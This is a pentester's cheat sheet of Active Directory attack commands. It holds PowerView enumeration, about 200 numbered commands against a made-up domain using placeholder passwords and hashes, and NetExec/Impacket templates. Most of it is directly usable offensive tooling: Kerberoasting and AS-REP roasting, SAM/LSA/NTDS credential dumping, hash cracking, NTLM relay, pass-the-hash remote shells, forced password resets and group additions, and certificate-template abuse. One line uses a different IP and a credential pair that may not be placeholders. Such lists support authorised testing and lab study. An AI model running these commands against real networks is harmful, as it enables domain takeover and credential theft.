## Enumration and pentest command
```bash
# ===================== BASIC DOMAIN =====================
Get-Domain
Get-DomainSID
Get-DomainPolicy
(Get-DomainPolicy)."SystemAccess"
(Get-DomainPolicy)."KerberosPolicy"
Get-DomainController
Get-DomainDNSZone
Get-DomainDNSRecord

# ===================== USERS =====================
Get-DomainUser
Get-DomainUser -Identity administrator
Get-DomainUser -Properties samaccountname,description
Get-DomainUser -Properties *
Get-DomainUser -SPN
Get-DomainUser -PreauthNotRequired
Get-DomainUser -TrustedToAuth
Get-DomainUser -AdminCount
Get-DomainUser -LDAPFilter "(adminCount=1)"
Get-DomainUser -LDAPFilter "(description=*pass*)"
Get-DomainUser -LDAPFilter "(description=*pwd*)"
Get-DomainUser -LDAPFilter "(description=*admin*)"

# ===================== GROUPS =====================
Get-DomainGroup
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroup -Identity "Enterprise Admins"
Get-DomainGroup -AdminCount
Get-DomainGroupMember "Domain Admins"
Get-DomainGroupMember "Enterprise Admins"
Get-DomainGroupMember "Schema Admins"
Get-DomainGroupMember "Administrators"
Get-DomainGroupMember -Identity "Domain Users"

# ===================== COMPUTERS =====================
Get-DomainComputer
Get-DomainComputer -OperatingSystem "*Windows*"
Get-DomainComputer -Ping
Get-DomainComputer -Unconstrained
Get-DomainComputer -TrustedToAuth
Get-DomainComputer -LDAPFilter "(operatingsystem=*server*)"

# ===================== OU & GPO =====================
Get-DomainOU
Get-DomainOU -FullData
Get-DomainGPO
Get-DomainGPO -Identity "<GPO Name>"
Get-DomainGPO -Properties *
Get-DomainGPOLocalGroup
Get-DomainGPOUserLocalGroupMapping

# ===================== ACL =====================
Get-ObjectAcl -SamAccountName administrator
Get-ObjectAcl -ResolveGUIDs
Get-ObjectAcl -Identity "Domain Admins"
Find-InterestingDomainAcl
Find-InterestingDomainAcl -ResolveGUIDs

# ===================== SHARES =====================
Invoke-ShareFinder
Invoke-ShareFinder -Verbose
Find-DomainShare
Find-DomainShare -CheckShareAccess
Find-InterestingDomainShareFile
Invoke-FileFinder
Invoke-FileFinder -SearchTerm password
Invoke-FileFinder -SearchTerm creds

# ===================== LOCAL ADMIN =====================
Find-LocalAdminAccess
Invoke-CheckLocalAdminAccess
Find-DomainUserLocation
Find-DomainUserLocation -Verbose

# ===================== SESSIONS =====================
Get-NetSession
Get-NetLoggedon
Get-NetRDPSession

# ===================== TRUSTS =====================
Get-DomainTrust
Get-Forest
Get-ForestDomain
Get-ForestTrust

# ===================== NETWORK =====================
Get-DomainSubnet
Get-DomainSite

# ===================== SID ENUM =====================
Convert-SidToName S-1-5-21-XXX-500
Convert-SidToName S-1-5-21-XXX-512
Convert-NameToSid administrator
Convert-NameToSid "Domain Admins"

# ===================== KERBEROS =====================
Get-DomainUser -SPN
Get-DomainUser -PreauthNotRequired
Get-DomainUser -TrustedToAuth

# ===================== PASSWORD HUNT =====================
Invoke-FileFinder -SearchTerm pass
Invoke-FileFinder -SearchTerm admin
Invoke-FileFinder -SearchTerm login
Invoke-FileFinder -SearchTerm secret

# ===================== PROCESS =====================
Find-DomainProcess
Find-DomainProcess -Verbose

# ===================== EVENTS =====================
Find-DomainUserEvent
Find-DomainUserEvent -Verbose

# ===================== ADVANCED =====================
Get-DomainObject
Get-DomainObject -LDAPFilter "(objectClass=*)"
Get-DomainObjectAcl
Get-DomainObjectAcl -ResolveGUIDs

# ===================== EXTRA ENUM =====================
Get-NetUser
Get-NetGroup
Get-NetComputer
Get-NetDomain
Get-NetDomainController

# ===================== ADMIN HUNT =====================
Invoke-UserHunter
Invoke-UserHunter -CheckAccess
Invoke-UserHunter -Stealth
Invoke-UserHunter -Verbose

# ===================== SHARE HUNT =====================
Invoke-ShareFinder -Threads 50
Invoke-FileFinder -Threads 50

# ===================== GPO ABUSE CHECK =====================
Get-DomainGPOUserLocalGroupMapping
Get-DomainGPOLocalGroup

# ===================== RANDOM USEFUL =====================
Get-DomainGroup -LDAPFilter "(name=*admin*)"
Get-DomainUser -LDAPFilter "(name=*svc*)"
Get-DomainUser -LDAPFilter "(name=*test*)"
Get-DomainUser -LDAPFilter "(name=*backup*)"

# ===================== RID BASED =====================
Convert-SidToName S-1-5-21-XXX-500
Convert-SidToName S-1-5-21-XXX-501
Convert-SidToName S-1-5-21-XXX-512
Convert-SidToName S-1-5-21-XXX-513
Convert-SidToName S-1-5-21-XXX-518
Convert-SidToName S-1-5-21-XXX-519

# ===================== LOOP ENUM =====================
1..100 | % {Convert-SidToName "S-1-5-21-XXX-$_"}

# ===================== FINAL =====================
Get-Domain
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
Find-LocalAdminAccess
Invoke-ShareFinder
```


```bash
# Active Directory Pentesting Commands (200 Commands with Fake Credentials)

Fake Domain: fakeorg.local  
Fake IP: 192.168.1.100  
Fake Credentials:  
- User: john.doe / Passw0rd123!  
- User: jane.smith / SecurePass456@  
- User: admin.user / AdminPass789#  
- Machine: srv01$ / Hash:4f46405647993c7d4e1dc1c25dd6ecf4  
- Machine: dc01$ / Hash:aabbccdd112233445566778899aabbcc  

## 1. Nmap (Reconnaissance)
1. nmap --privileged -sCV -vv -Pn -oN nmap.txt 192.168.1.100
2. nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985 -sV -O 192.168.1.100
3. nmap --script smb-enum-shares -p 445 192.168.1.100
4. nmap --script smb-os-discovery -p 445 192.168.1.100
5. nmap --script ldap-rootdse -p 389 192.168.1.100
6. nmap --script kerberos-sec -p 88 192.168.1.100
7. nmap --script smb2-security-mode -p 445 192.168.1.100
8. nmap --script smb2-time -p 445 192.168.1.100
9. nmap -sU -p 53 --script dns-nsid 192.168.1.100
10. nmap -p 80 --script http-enum 192.168.1.100
11. nmap --script smb-enum-users -p 445 192.168.1.100
12. nmap --script smb-enum-domains -p 445 192.168.1.100
13. nmap -p 445 --script smb-vuln-ms17-010 192.168.1.100
14. nmap -p 389 --script ldap-search 192.168.1.100
15. nmap -p 445 --script smb-protocols 192.168.1.100

# smbclient
smbclient \\target\share -U user      # Access SMB share 📂
smbclient -L target                   # List shares (anonymous) 📜
enum4linux -a target                  # Enumerate shares/users 🔍

## 2. SMBMap (SMB Share Enumeration)
16. smbmap -H 192.168.1.100 -u john.doe -p 'Passw0rd123!'
17. smbmap -H 192.168.1.100 -u jane.smith -p 'SecurePass456@' -d fakeorg.local
18. smbmap -H 192.168.1.100 -u john.doe -p 'Passw0rd123!' -R
19. smbmap -H 192.168.1.100 -u jane.smith -p 'SecurePass456@' --download SYSVOL\file.txt
20. smbmap -H 192.168.1.100 -u john.doe -p 'Passw0rd123!' --upload local.txt SYSVOL\test.txt
21. smbmap -H 192.168.1.100 --no-auth -R
22. smbmap -H 192.168.1.100 -u jane.smith -p 'SecurePass456@' --dir-only
23. smbmap -H 192.168.1.100 -u john.doe -p 'Passw0rd123!' --file-only
24. smbmap -H 192.168.1.100 -u jane.smith -p 'SecurePass456@' -q
25. smbmap -H 192.168.1.100 -u john.doe -p 'Passw0rd123!' --depth 3

## 3. NetExec (nxc) (AD Enumeration and Exploitation)
26. nxc smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' -d fakeorg.local --shares
27. nxc smb 192.168.1.100 -u jane.smith -p 'SecurePass456@' -d fakeorg.local --users
28. nxc smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' -d fakeorg.local --groups
00. nxc ldap 192.168.159.129 -u schoudhari -p 'Sch0udhari123' --users
29. nxc ldap 192.168.1.100 -u john.doe -p 'Passw0rd123!' -d FAKEORG.LOCAL --bloodhound -c All --dns-server 192.168.1.100 --verbose
30. nxc ldap 192.168.1.100 -u jane.smith -p 'SecurePass456@' -d FAKEORG.LOCAL --bloodhound -c All --dns-server 192.168.1.100 --verbose
31. nxc smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' -d fakeorg.local --pass-pol
32. nxc smb 192.168.1.100 -u jane.smith -p 'SecurePass456@' -d fakeorg.local --rid-brute
33. nxc smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' -d fakeorg.local --sessions
34. nxc winrm 192.168.1.100 -u jane.smith -p 'SecurePass456@' -d fakeorg.local -x "whoami"
35. nxc ldap 192.168.1.100 -u john.doe -p 'Passw0rd123!' -d fakeorg.local --kerberoast
36. nxc smb 192.168.1.100 -u jane.smith -p 'SecurePass456@' -d fakeorg.local --loggedon-users
37. nxc smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' -d fakeorg.local --sam
38. nxc smb 192.168.1.100 -u jane.smith -p 'SecurePass456@' -d fakeorg.local --lsa
39. nxc smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' -d fakeorg.local --ntds
40. nxc ldap 192.168.1.100 -u jane.smith -p 'SecurePass456@' -d fakeorg.local --password-not-required
41. nxc smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' --local-auth
42. nxc ldap 192.168.1.100 -u jane.smith -p 'SecurePass456@' -d fakeorg.local --trusted-for-delegation
43. nxc smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' -d fakeorg.local --disks
44. nxc smb 192.168.1.100 -u jane.smith -p 'SecurePass456@' -d fakeorg.local --printers
45. nxc ldap 192.168.1.100 -u john.doe -p 'Passw0rd123!' -d fakeorg.local --asreproast

## 4. TargetedKerberoast (Kerberoasting)
46. faketime -f "2025-09-25 12:00:00" python3 targetedKerberoast.py -v -d fakeorg.local -u john.doe -p 'Passw0rd123!'
47. python3 targetedKerberoast.py -d fakeorg.local -u jane.smith -p 'SecurePass456@' --dc-ip 192.168.1.100
48. python3 targetedKerberoast.py -d fakeorg.local -u john.doe -p 'Passw0rd123!' --outputfile kerberoast.txt
49. python3 targetedKerberoast.py -d fakeorg.local -u jane.smith -p 'SecurePass456@' --spn cifs/dc01.fakeorg.local
50. python3 targetedKerberoast.py -d fakeorg.local -u john.doe -p 'Passw0rd123!' --no-pass
51. python3 targetedKerberoast.py -d fakeorg.local -u jane.smith -p 'SecurePass456@' --request
52. python3 targetedKerberoast.py -d fakeorg.local -u john.doe -p 'Passw0rd123!' --timeout 10
53. python3 targetedKerberoast.py -d fakeorg.local -u jane.smith -p 'SecurePass456@' --dc-ip 192.168.1.100 --verbose
54. python3 targetedKerberoast.py -d fakeorg.local -u john.doe -p 'Passw0rd123!' --users-file users.txt
55. python3 targetedKerberoast.py -d fakeorg.local -u jane.smith -p 'SecurePass456@' --krb5ccache ticket.ccache

## 5. John the Ripper (Password Cracking)
56. john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
57. john --format=krb5tgs kerberoast.txt
58. john --wordlist=/usr/share/wordlists/rockyou.txt --rules kerberoast.txt
59. john --format=krb5asrep asreproast.txt
60. john --wordlist=custom_wordlist.txt kerberoast.txt
61. john --format=nt ntds_hashes.txt
62. john --format=netntlmv2 responder_hashes.txt
63. john --wordlist=/usr/share/wordlists/rockyou.txt --incremental kerberoast.txt
64. john --format=krb5tgs --show kerberoast.txt
65. john --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 kerberoast.txt

## 6. CrackMapExec (Credential Validation and Exploitation)
66. crackmapexec smb 192.168.1.100 -u john.doe -p 'Passw0rd123!'
67. crackmapexec smb 192.168.1.100 -u jane.smith -p 'SecurePass456@' -d fakeorg.local
68. crackmapexec winrm 192.168.1.100 -u john.doe -p 'Passw0rd123!' -d fakeorg.local
69. crackmapexec smb 192.168.1.100 -u jane.smith -H 4f46405647993c7d4e1dc1c25dd6ecf4
70. crackmapexec smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' --local-auth
71. crackmapexec smb 192.168.1.100 -u jane.smith -p 'SecurePass456@' --shares
72. crackmapexec smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' --users
73. crackmapexec smb 192.168.1.100 -u jane.smith -p 'SecurePass456@' --groups
74. crackmapexec smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' --pass-pol
75. crackmapexec smb 192.168.1.100 -u jane.smith -p 'SecurePass456@' --rid-brute
76. crackmapexec smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' --sessions
77. crackmapexec smb 192.168.1.100 -u jane.smith -p 'SecurePass456@' --sam
78. crackmapexec smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' --lsa
79. crackmapexec smb 192.168.1.100 -u jane.smith -p 'SecurePass456@' --ntds
80. crackmapexec smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' --gpp-autologin
81. crackmapexec winrm 192.168.1.100 -u jane.smith -p 'SecurePass456@' -x "net user"
82. crackmapexec smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' --loggedon-users
83. crackmapexec smb 192.168.1.100 -u jane.smith -p 'SecurePass456@' --spider C$
84. crackmapexec smb 192.168.1.100 -u john.doe -p 'Passw0rd123!' --gen-relay-list
85. crackmapexec smb 192.168.1.100 -u jane.smith -p 'SecurePass456@' --disks

## 7. BloodyAD (AD Manipulation)
86. bloodyAD --host 192.168.1.100 -d fakeorg.local -u john.doe -p 'Passw0rd123!' add groupMember ITAdmins john.doe
87. bloodyAD --host 192.168.1.100 -d fakeorg.local -u jane.smith -p 'SecurePass456@' set password bob.smith 'NewPass789#'
88. bloodyAD --host 192.168.1.100 -d fakeorg.local -u john.doe -p 'Passw0rd123!' add user new.user 'NewPass123!'
89. bloodyAD --host 192.168.1.100 -d fakeorg.local -u jane.smith -p 'SecurePass456@' remove groupMember ITAdmins john.doe
90. bloodyAD --host 192.168.1.100 -d fakeorg.local -u john.doe -p 'Passw0rd123!' set owner bob.smith jane.smith
91. bloodyAD --host 192.168.1.100 -d fakeorg.local -u jane.smith -p 'SecurePass456@' add computer newpc01 'CompPass456@'
92. bloodyAD --host 192.168.1.100 -d fakeorg.local -u john.doe -p 'Passw0rd123!' get users
93. bloodyAD --host 192.168.1.100 -d fakeorg.local -u jane.smith -p 'SecurePass456@' get groups
94. bloodyAD --host 192.168.1.100 -d fakeorg.local -u john.doe -p 'Passw0rd123!' get computers
95. bloodyAD --host 192.168.1.100 -d fakeorg.local -u jane.smith -p 'SecurePass456@' set dacl bob.smith john.doe FullControl

## 8. gMSADumper (Machine Account Credential Dumping)
96. python3 gMSADumper.py -u john.doe -p 'Passw0rd123!' -d fakeorg.local
97. python3 gMSADumper.py -u jane.smith -p 'SecurePass456@' -d fakeorg.local --dc-ip 192.168.1.100
98. python3 gMSADumper.py -u john.doe -p 'Passw0rd123!' -d fakeorg.local --computer srv01$
99. python3 gMSADumper.py -u jane.smith -p 'SecurePass456@' -d fakeorg.local --verbose
100. python3 gMSADumper.py -u john.doe -p 'Passw0rd123!' -d fakeorg.local --output hashes.txt
101. python3 gMSADumper.py -u jane.smith -p 'SecurePass456@' -d fakeorg.local --group ITAdmins
102. python3 gMSADumper.py -u john.doe -p 'Passw0rd123!' -d fakeorg.local --no-pass
103. python3 gMSADumper.py -u jane.smith -p 'SecurePass456@' -d fakeorg.local --local
104. python3 gMSADumper.py -u john.doe -p 'Passw0rd123!' -d fakeorg.local --timeout 10
105. python3 gMSADumper.py -u jane.smith -p 'SecurePass456@' -d fakeorg.local --kerberos

## 9. BloodHound-Python (AD Enumeration for BloodHound)
106. bloodhound-python -u john.doe -p 'Passw0rd123!' -d fakeorg.local -ns 192.168.1.100 -c All --zip
107. bloodhound-python -u srv01$ --hashes :4f46405647993c7d4e1dc1c25dd6ecf4 -d fakeorg.local -ns 192.168.1.100 -c All --zip
108. bloodhound-python -u jane.smith -p 'SecurePass456@' -d fakeorg.local -ns 192.168.1.100 -c DCOnly
109. bloodhound-python -u john.doe -p 'Passw0rd123!' -d fakeorg.local -ns 192.168.1.100 -c Group
110. bloodhound-python -u jane.smith -p 'SecurePass456@' -d fakeorg.local -ns 192.168.1.100 -c User
111. bloodhound-python -u john.doe -p 'Passw0rd123!' -d fakeorg.local -ns 192.168.1.100 -c Computer
112. bloodhound-python -u jane.smith -p 'SecurePass456@' -d fakeorg.local -ns 192.168.1.100 -c Session
113. bloodhound-python -u john.doe -p 'Passw0rd123!' -d fakeorg.local -ns 192.168.1.100 -c ACL
114. bloodhound-python -u jane.smith -p 'SecurePass456@' -d fakeorg.local -ns 192.168.1.100 --dns-tcp
115. bloodhound-python -u john.doe -p 'Passw0rd123!' -d fakeorg.local -ns 192.168.1.100 --no-pass

## 10. Impacket (AD Exploitation and Enumeration)
116. impacket-owneredit -action write -target bob.smith -new-owner jane.smith 'fakeorg.local/john.doe:Passw0rd123!' -dc-ip 192.168.1.100
117. python3 /usr/share/doc/python3-impacket/examples/dacledit.py -action write -rights FullControl -principal jane.smith -target bob.smith 'fakeorg.local/john.doe:Passw0rd123!' -dc-ip 192.168.1.100
118. impacket-secretsdump fakeorg.local/jane.smith:SecurePass456@@192.168.1.100
119. impacket-wmiexec fakeorg.local/john.doe:Passw0rd123!@192.168.1.100 "whoami"
120. impacket-smbexec fakeorg.local/jane.smith:SecurePass456@@192.168.1.100
121. impacket-psexec fakeorg.local/john.doe:Passw0rd123!@192.168.1.100
122. impacket-rpcdump 192.168.1.100
123. impacket-getTGT fakeorg.local/jane.smith:SecurePass456@
124. impacket-getST -spn cifs/dc01.fakeorg.local fakeorg.local/john.doe:Passw0rd123! -dc-ip 192.168.1.100
125. impacket-GetUserSPNs -dc-ip 192.168.1.100 fakeorg.local/jane.smith:SecurePass456@
126. impacket-samrdump 192.168.1.100
127. impacket-ntlmrelayx -t smb://192.168.1.100
128. impacket-reg -dc-ip 192.168.1.100 fakeorg.local/john.doe:Passw0rd123! query -keyName HKLM\SYSTEM
129. impacket-ticketer -nthash 4f46405647993c7d4e1dc1c25dd6ecf4 -domain-sid S-1-5-21-123456789-987654321-1122334455 -domain fakeorg.local -spn cifs/dc01.fakeorg.local
130. impacket-ldapdomaindump fakeorg.local/jane.smith:SecurePass456@@192.168.1.100
131. impacket-mimikatz fakeorg.local/john.doe:Passw0rd123!@192.168.1.100
132. impacket-getArch 192.168.1.100
133. impacket-dcomexec fakeorg.local/jane.smith:SecurePass456@@192.168.1.100 MMC20
134. impacket-lookupsid fakeorg.local/john.doe:Passw0rd123!@192.168.1.100
135. impacket-GetNPUsers fakeorg.local/jane.smith:SecurePass456@ -dc-ip 192.168.1.100 -request

## 11. Evil-WinRM (Remote Shell Access)
136. evil-winrm -i 192.168.1.100 -u john.doe -p 'Passw0rd123!'
137. evil-winrm -i 192.168.1.100 -u jane.smith -p 'SecurePass456@'
138. evil-winrm -i 192.168.1.100 -u john.doe -H 4f46405647993c7d4e1dc1c25dd6ecf4
139. evil-winrm -i 192.168.1.100 -u jane.smith -p 'SecurePass456@' -s /path/to/scripts/
140. evil-winrm -i 192.168.1.100 -u john.doe -p 'Passw0rd123!' -e /path/to/exe
141. evil-winrm -i 192.168.1.100 -u jane.smith -p 'SecurePass456@' -r fakeorg.local
142. evil-winrm -i 192.168.1.100 -u john.doe -p 'Passw0rd123!' --no-colors
143. evil-winrm -i 192.168.1.100 -u jane.smith -p 'SecurePass456@' -t 10
144. evil-winrm -i 192.168.1.100 -u john.doe -p 'Passw0rd123!' -k /path/to/krb5ccache
145. evil-winrm -i 192.168.1.100 -u jane.smith -p 'SecurePass456@' --log-level debug

## 12. PowerShell (AD Enumeration and Manipulation in WinRM)
146. Get-ADUser -Filter * -Properties * -Server dc01.fakeorg.local -Credential (New-Object System.Management.Automation.PSCredential("fakeorg.local\john.doe",(ConvertTo-SecureString "Passw0rd123!" -AsPlainText -Force)))
147. Get-ADGroup -Filter * -Properties * -Server dc01.fakeorg.local -Credential (New-Object System.Management.Automation.PSCredential("fakeorg.local\jane.smith",(ConvertTo-SecureString "SecurePass456@" -AsPlainText -Force)))
148. Get-ADComputer -Filter * -Properties * -Server dc01.fakeorg.local -Credential (New-Object System.Management.Automation.PSCredential("fakeorg.local\john.doe",(ConvertTo-SecureString "Passw0rd123!" -AsPlainText -Force)))
149. Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties * -Server dc01.fakeorg.local -Credential (New-Object System.Management.Automation.PSCredential("fakeorg.local\jane.smith",(ConvertTo-SecureString "SecurePass456@" -AsPlainText -Force)))
150. $deletedUser = Get-ADObject -Filter 'sAMAccountName -eq "bob.smith"' -IncludeDeletedObjects -Server dc01.fakeorg.local -Credential (New-Object System.Management.Automation.PSCredential("fakeorg.local\john.doe",(ConvertTo-SecureString "Passw0rd123!" -AsPlainText -Force))) | Sort-Object whenCreated -Descending | Select-Object -First 1
151. Restore-ADObject -Identity $deletedUser -Server dc01.fakeorg.local -Credential (New-Object System.Management.Automation.PSCredential("fakeorg.local\jane.smith",(ConvertTo-SecureString "SecurePass456@" -AsPlainText -Force)))
152. Set-ADAccountPassword -Identity "bob.smith" -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewPass789#" -Force) -Server dc01.fakeorg.local -Credential (New-Object System.Management.Automation.PSCredential("fakeorg.local\john.doe",(ConvertTo-SecureString "Passw0rd123!" -AsPlainText -Force)))
153. Unlock-ADAccount -Identity "bob.smith" -Server dc01.fakeorg.local -Credential (New-Object System.Management.Automation.PSCredential("fakeorg.local\jane.smith",(ConvertTo-SecureString "SecurePass456@" -AsPlainText -Force)))
154. Get-ADGroupMember -Identity "ITAdmins" -Server dc01.fakeorg.local -Credential (New-Object System.Management.Automation.PSCredential("fakeorg.local\john.doe",(ConvertTo-SecureString "Passw0rd123!" -AsPlainText -Force)))
155. Add-ADGroupMember -Identity "ITAdmins" -Members "bob.smith" -Server dc01.fakeorg.local -Credential (New-Object System.Management.Automation.PSCredential("fakeorg.local\jane.smith",(ConvertTo-SecureString "SecurePass456@" -AsPlainText -Force)))
156. Get-ADDomain -Server dc01.fakeorg.local -Credential (New-Object System.Management.Automation.PSCredential("fakeorg.local\john.doe",(ConvertTo-SecureString "Passw0rd123!" -AsPlainText -Force))) | Select-Object Name, DomainSID
157. Get-ADForest -Server dc01.fakeorg.local -Credential (New-Object System.Management.Automation.PSCredential("fakeorg.local\jane.smith",(ConvertTo-SecureString "SecurePass456@" -AsPlainText -Force))) | Select-Object Name, Domains
158. Get-ADUser -Filter 'Enabled -eq $true' -Properties PasswordLastSet -Server dc01.fakeorg.local -Credential (New-Object System.Management.Automation.PSCredential("fakeorg.local\john.doe",(ConvertTo-SecureString "Passw0rd123!" -AsPlainText -Force)))
159. Get-ADComputer -Filter 'Enabled -eq $true' -Properties OperatingSystem -Server dc01.fakeorg.local -Credential (New-Object System.Management.Automation.PSCredential("fakeorg.local\jane.smith",(ConvertTo-SecureString "SecurePass456@" -AsPlainText -Force)))
160. Get-ADObject -Filter 'objectClass -eq "organizationalUnit"' -Properties * -Server dc01.fakeorg.local -Credential (New-Object System.Management.Automation.PSCredential("fakeorg.local\john.doe",(ConvertTo-SecureString "Passw0rd123!" -AsPlainText -Force)))

## 13. Certipy (Certificate Template Exploitation)
161. certipy find -u john.doe -p 'Passw0rd123!' -dc-ip 192.168.1.100 -vulnerable
162. certipy-ad req -u jane.smith -p 'SecurePass456@' -dc-ip 192.168.1.100 -target dc01.fakeorg.local -ca fakeorg-CA-1 -template WebServer -upn administrator@fakeorg.local
163. certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.1.100 -ldap-shell
164. certipy find -u john.doe -p 'Passw0rd123!' -dc-ip 192.168.1.100 -text -output certipy_output
165. certipy-ad req -u jane.smith -p 'SecurePass456@' -dc-ip 192.168.1.100 -target dc01.fakeorg.local -ca fakeorg-CA-1 -template WebServer -dns dc01.fakeorg.local
166. certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.1.100 -username fakeorg.local\admin.user
167. certipy find -u john.doe -p 'Passw0rd123!' -dc-ip 192.168.1.100 -enabled
168. certipy-ad req -u jane.smith -p 'SecurePass456@' -dc-ip 192.168.1.100 -target dc01.fakeorg.local -ca fakeorg-CA-1 -template WebServer -sid S-1-5-21-123456789-987654321-1122334455-500
169. certipy find -u john.doe -p 'Passw0rd123!' -dc-ip 192.168.1.100 -json
170. certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.1.100 -debug

## 14. Ldapsearch (LDAP Enumeration)
171. ldapsearch -H ldap://192.168.1.100 -x -D "john.doe@fakeorg.local" -w 'Passw0rd123!' -b "DC=fakeorg,DC=local" "(objectClass=user)"
172. ldapsearch -H ldaps://192.168.1.100:636 -x -D "jane.smith@fakeorg.local" -w 'SecurePass456@' -b "DC=fakeorg,DC=local" "(objectClass=group)"
173. ldapsearch -H ldap://192.168.1.100 -x -D "john.doe@fakeorg.local" -w 'Passw0rd123!' -b "DC=fakeorg,DC=local" "(servicePrincipalName=*)"
174. ldapsearch -H ldap://192.168.1.100 -x -D "jane.smith@fakeorg.local" -w 'SecurePass456@' -b "DC=fakeorg,DC=local" "(objectClass=computer)"
175. ldapsearch -H ldap://192.168.1.100 -x -D "john.doe@fakeorg.local" -w 'Passw0rd123!' -b "CN=Deleted Objects,DC=fakeorg,DC=local" "(isDeleted=TRUE)"

## 15. Responder (NTLM Relay Attacks)
176. responder -I eth0
177. responder -I eth0 -v
178. responder -I eth0 --wpad
179. responder -I eth0 --lm
180. responder -I eth0 -A

## 16. Kerbrute (Kerberos Enumeration)
181. kerbrute userenum -d fakeorg.local --dc 192.168.1.100 users.txt
182. kerbrute password -d fakeorg.local --dc 192.168.1.100 users.txt passwords.txt
183. kerbrute bruteforce -d fakeorg.local --dc 192.168.1.100 users.txt
184. kerbrute userenum -d fakeorg.local --dc 192.168.1.100 users.txt --output users_output.txt
185. kerbrute password -d fakeorg.local --dc 192.168.1.100 users.txt passwords.txt --delay 100

## 17. Hashcat (Password Cracking)
186. hashcat -m 13100 -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt
187. hashcat -m 18200 -a 0 asreproast.txt /usr/share/wordlists/rockyou.txt
188. hashcat -m 1000 -a 0 ntds_hashes.txt /usr/share/wordlists/rockyou.txt
189. hashcat -m 13100 -a 3 kerberoast.txt ?u?l?d?s
190. hashcat -m 18200 -a 0 asreproast.txt custom_wordlist.txt --force

## 18. ADExplorer (AD Snapshot)
191. ADExplorer.exe -server 192.168.1.100 -user fakeorg.local\john.doe -password 'Passw0rd123!'
192. ADExplorer.exe -server 192.168.1.100 -user fakeorg.local\jane.smith -password 'SecurePass456@' -snapshot fakeorg_snapshot

## 19. Rubeus (Kerberos Attacks)
193. Rubeus.exe kerberoast /outfile:kerberoast.txt
194. Rubeus.exe asreproast /format:hashcat /outfile:asreproast.txt
195. Rubeus.exe s4u /user:john.doe /password:'Passw0rd123!' /domain:fakeorg.local /msdsspn:cifs/dc01.fakeorg.local
196. Rubeus.exe tgtdeleg
197. Rubeus.exe harvest /interval:30

## 20. Miscellaneous (Other Useful Commands)
198. enum4linux -a 192.168.1.100
199. rpcclient -U "fakeorg.local\john.doe%'Passw0rd123!'" 192.168.1.100
200. net view \\192.168.1.100 /all
```
```
## extra
# =========================
# BASIC ENUMERATION
# =========================

# Domain info
nxc ldap <IP> -u <user> -p '<pass>' -d <domain>

# List users
nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --users

# Export users
nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --users-export users.txt

# List groups
nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --groups

# List computers (VERY IMPORTANT)
nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --computers

# Domain Controllers
nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --dc-list


# =========================
# PRIVILEGE & MISCONFIG ENUM
# =========================

# Delegation (important for attacks)
nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --find-delegation

# Unconstrained delegation
nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --trusted-for-delegation

# AdminCount = 1 users (privileged)
nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --admin-count

# Users with no password requirement
nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --password-not-required

# Active users
nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --active-users


# =========================
# KERBEROS ATTACK ENUM
# =========================

# AS-REP roastable users
nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --asreproast asrep.txt

# Kerberoastable users
nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --kerberoasting kerberoast.txt


# =========================
# gMSA ENUMERATION
# =========================

# List gMSA accounts
nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --gmsa

# Convert gMSA SID
nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --gmsa-convert-id <ID>


# =========================
# BLOODHOUND COLLECTION
# =========================

# Full BloodHound data
nxc ldap <IP> -u <user> -p '<pass>' -d <domain> --bloodhound -c all


# =========================
# IMPACKET (ALTERNATIVE)
# =========================

# Get SPNs (Kerberoast)
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <IP>

# Request TGS hash
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <IP> -request

# AS-REP roast
impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass


# =========================
# CUSTOM LDAP QUERY
# =========================

# Custom LDAP query
nxc ldap <IP> -u <user> -p '<pass>' -d <domain> \
--query "(objectClass=user)" "sAMAccountName"
```
